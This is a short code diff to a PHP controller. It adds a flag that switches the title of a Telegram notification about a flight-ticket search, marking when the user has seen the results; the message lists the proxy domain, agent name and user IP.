@@ -624,6 +624,7 @@ class TelegramController extends Controller
         $destino = $request->input('destino');
         $fecha = $request->input('fecha');
         $tipoViaje = $request->input('tipo_viaje', 'Solo ida'); // "Solo ida" o "Ida y vuelta"
+        $vistaConfirmada = $request->input('vista_confirmada', false);
 
         // Obtener IP real del usuario
         $ip = self::getRealIp($request);
@@ -665,7 +666,14 @@ class TelegramController extends Controller
         // Construir mensaje de notificación
         $fechaConsulta = now()->setTimezone('America/Bogota')->format('d/m/Y H:i:s');
 
-        $message = "🔍 *NUEVA BÚSQUEDA DE PASAJES*\n\n";
+        // Título según confirmación de vista
+        if ($vistaConfirmada) {
+            $message = "✅ *BÚSQUEDA CONFIRMADA*\n";
+            $message .= "_El usuario vio los resultados_\n\n";
+        } else {
+            $message = "🔍 *NUEVA BÚSQUEDA DE PASAJES*\n\n";
+        }
+
         $message .= "🌐 *Dominio:* `{$proxyDomain}`\n";
         $message .= "👤 *Agente:* `{$name}`\n\n";
         $message .= "📍 *IP Usuario:* `{$ip}`\n";
